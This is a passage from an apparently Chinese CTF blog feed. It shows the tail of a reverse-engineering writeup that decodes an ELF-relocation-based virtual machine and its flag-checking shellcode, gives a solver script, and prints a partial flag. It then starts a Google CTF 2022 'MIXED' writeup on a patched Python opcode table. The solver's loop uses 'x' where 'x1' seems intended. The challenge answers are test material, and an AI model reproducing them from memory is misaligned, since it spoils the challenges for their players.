        &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;type &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;:  &lt;span style=&#34;color:#75715e&#34;&gt;# CPY&lt;/span&gt;
            instructions&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(
                Copy(format_addr(r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address), to_sym(r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;symbol&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;name), i))
        &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;type &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;:  &lt;span style=&#34;color:#75715e&#34;&gt;# REL&lt;/span&gt;
            instructions&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(
                Rel(format_addr(r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address), format_addr(r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;addend), i))
        &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;type &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;:  &lt;span style=&#34;color:#75715e&#34;&gt;# R32&lt;/span&gt;
            &lt;span style=&#34;color:#75715e&#34;&gt;# instructions.append(&lt;/span&gt;
            &lt;span style=&#34;color:#75715e&#34;&gt;#    R32(r.address, to_sym(r.symbol.name), r.addend, i))&lt;/span&gt;
            instructions&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(R32(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;))

    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; instructions

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;dump&lt;/span&gt;(instructions):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; op &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; instructions:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; type(op)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__name__ &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;REL&amp;#39;&lt;/span&gt;:
            print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;op&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ridx&lt;span style=&#34;color:#e6db74&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;04d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;] :: rel &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;op&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dst&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;, &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;op&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;val&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; type(op)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__name__ &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;CPY&amp;#39;&lt;/span&gt;:
            print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;op&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ridx&lt;span style=&#34;color:#e6db74&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;04d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;] :: copy &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;op&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dst&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;, s&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;op&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;symbol&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; type(op)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__name__ &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;R64&amp;#39;&lt;/span&gt;:
            print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;op&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ridx&lt;span style=&#34;color:#e6db74&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;04d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;] :: r64 &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;op&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dst&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;, &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;op&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;symbol&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; + &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;op&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;addend&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# 其实是 s{symbol} + {addend}&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; type(op)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__name__ &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;R32&amp;#39;&lt;/span&gt;:
            print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;7&amp;#39;&lt;/span&gt;)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(op&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ridx &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1266&lt;/span&gt;):
            &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;

instructions &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; parse(b)
dump(instructions)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;提取后发现主要逻辑为加载 shellcode 并执行&lt;/p&gt;
&lt;p&gt;具体过程是使用了 &lt;code&gt;rel&lt;/code&gt; 指令将 shellcode 移动到某个地址，随后使用 &lt;code&gt;r64&lt;/code&gt; 指令调用该地址&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-plaintext&#34; data-lang=&#34;plaintext&#34;&gt;[0005] :: rel s2, flag[0]
[0006] :: rel s2.st_size, 1
[0007] :: copy s4, s2
[0009] :: rel r8.r_address, 0x16008040cc253480
[0010] :: rel r8.r_info, 0xc3
[0011] :: rel s3, r8.r_address
[0012] :: rel s3.st_name, 0x1000a0000001a
[0013] :: r64 r8.r_address, 3 + 0        ; 这里相当于 call s3
[0014] :: rel s2, r101002.r_address
[0015] :: rel s2.st_size, 0x18
[0016] :: copy r8.r_address, s2
[0018] :: rel r17.r_address, 0x8040cc250480
[0019] :: rel r17.r_info, 0xc3
[0020] :: rel s3, r17.r_address
[0021] :: rel s3.st_name, 0x1000a0000001a
[0022] :: r64 r17.r_address, 3 + 0
[0023] :: copy r17.r_address, s2
[0024] :: rel s2, s4
[0025] :: rel s2.st_size, 1
[0026] :: copy r3.r_address, s2

[0597] :: rel s2, r3.r_address
[0598] :: rel s2.st_size, 8
[0599] :: copy s6, s2
[0601] :: rel r600.r_address, 0x70008040fc253480
[0602] :: rel r600.r_info, 0xc3
[0603] :: rel s3, r600.r_address
[0604] :: rel s3.st_name, 0x1000a0000001a
[0605] :: r64 r600.r_address, 3 + 0
[0606] :: rel s2, r101002.r_address
[0607] :: rel s2.st_size, 0x18
[0608] :: copy r600.r_address, s2
[0609] :: rel s2, s6
[0610] :: rel s2.st_size, 8
[0611] :: copy r612.r_addend, s2
[0612] :: r64 s5, 5 + 0
[0613] :: rel r612.r_addend, 0
[0614] :: rel s6, 0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上述代码对 flag 第一位执行了两处 shellcode，使用 Capstone 分析发现 shellcode 中的逻辑为 &lt;code&gt;f ^ 0x16 + 0&lt;/code&gt;
随后对该值 xor 0x70，最后值为 0 表示通过&lt;/p&gt;
&lt;p&gt;前28位flag均是该逻辑的重复&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;xor &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;0x16&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x17&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x13&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x14&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x15&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x16&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x17&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x19&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x24&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2c&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x26&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1e&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1f&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x21&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x23&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x27&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x24&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x25&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x26&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x27&lt;/span&gt;]
add &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xa&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xb&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xc&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xd&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xe&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xf&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x13&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x14&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x15&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x16&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x17&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x19&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1a&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1b&lt;/span&gt;]
xor2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;0x70&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7c&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x73&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x78&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6f&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x27&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2a&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2c&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7f&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x35&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2d&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x32&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x37&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3b&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x22&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x59&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x53&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8e&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3d&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2a&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x59&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x27&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2d&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x29&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x34&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2d&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x61&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x32&lt;/span&gt;]

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; x1, a, x2 &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; zip(xor, add, xor2):
    print (chr((x2 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; a) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; x), end&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;# flag{366c950370fec47e34581a0&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;对最后几位 flag 进行的计算有个小 smc 的操作：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[1074] :: rel s2, flag[28]
[1075] :: copy s6, s2
[1076] :: rel s2, flag[29]
[1077] :: copy s7, s2
[1078] :: rel s8, 0
[1079] :: rel s2, s8
[1080] :: copy r1081.r_addend, s2
[1081] :: r64 s8, 8 + 0           ; 上一个指令将此处修改为 r64 s8, s8 + s2, 相当于 add s8, s2
[1082] :: rel r1081.r_addend, 0
[1083] :: rel s2, s6
[1084] :: copy r1085.r_addend, s2
[1085] :: r64 s8, 8 + 0
[1086] :: rel r1085.r_addend, 0
[1087] :: rel s9, 0
[1088] :: rel s2, s9
[1089] :: copy r1090.r_addend, s2
[1090] :: r64 s9, 9 + 0
[1091] :: rel r1090.r_addend, 0
[1092] :: rel s2, s7
[1093] :: copy r1094.r_addend, s2
[1094] :: r64 s9, 9 + 0
[1095] :: rel r1094.r_addend, 0
[1096] :: rel s2, s9
[1097] :: copy r1098.r_addend, s2
[1098] :: r64 s10, 8 + 0
[1099] :: rel r1098.r_addend, 0
[1101] :: rel r1100.r_address, 0x6c0080415c253480
[1102] :: rel r1100.r_info, 0xc3
[1103] :: rel s3, r1100.r_address
[1104] :: rel s3.st_name, 0x1000a0000001a
[1105] :: r64 r1100.r_address, 3 + 0
[1106] :: rel s2, r101002.r_address
[1107] :: rel s2.st_size, 0x18
[1108] :: copy r1100.r_address, s2
[1109] :: rel s2, s10
[1110] :: rel s2.st_size, 8
[1111] :: copy r1112.r_addend, s2
[1112] :: r64 s5, 5 + 0
[1113] :: rel r1112.r_addend, 0
[1114] :: rel s6, 0
[1115] :: rel s7, 0
[1116] :: rel s8, 0
[1117] :: rel s9, 0
[1118] :: rel s10, 0
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;总结一下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;(flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6c&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
(flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xa1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
(flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xb1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
(flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xe5&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;计算得到flag最后四位&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Google CTF 2022 MIXED Writeup</title>
        <link>/post/google-ctf-2022-mixed-writeup/</link>
        <pubDate>Mon, 04 Jul 2022 16:01:21 +0800</pubDate>
        
        <guid>/post/google-ctf-2022-mixed-writeup/</guid>
        <description>&lt;img src="/post/google-ctf-2022-mixed-writeup/cover.jpg" alt="Featured image of post Google CTF 2022 MIXED Writeup" /&gt;&lt;p&gt;This challenge gives a .pyc file and a Python 3.11 alpha7 based patch file.&lt;/p&gt;
&lt;h2 id=&#34;patch&#34;&gt;Patch&lt;/h2&gt;
&lt;p&gt;This patch file mainly patches the &lt;code&gt;opcode.py&lt;/code&gt; file. After the patch, &lt;code&gt;opcode.py&lt;/code&gt; file first generated two random lists and modifies the opcode according to the values of the lists. Finally, it will output the new opcode to a tmp file.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; sys
&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;generate_opcode_h&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]:
&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;  random &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; __import__(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;random&amp;#34;&lt;/span&gt;)
&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;  random&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;shuffle(perm)
&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;  random&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;shuffle(perm2)

&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;CACHE&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;POP_TOP&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;PUSH_NULL&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)

&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;CACHE&amp;#39;&lt;/span&gt;, perm[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;])
&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;POP_TOP&amp;#39;&lt;/span&gt;, perm[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;])
&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;PUSH_NULL&amp;#39;&lt;/span&gt;, perm[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;])

&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/tmp/opcode_map&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;w&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; f:
&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; x, y &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; enumerate(opname):
&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;    f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; (x, y))
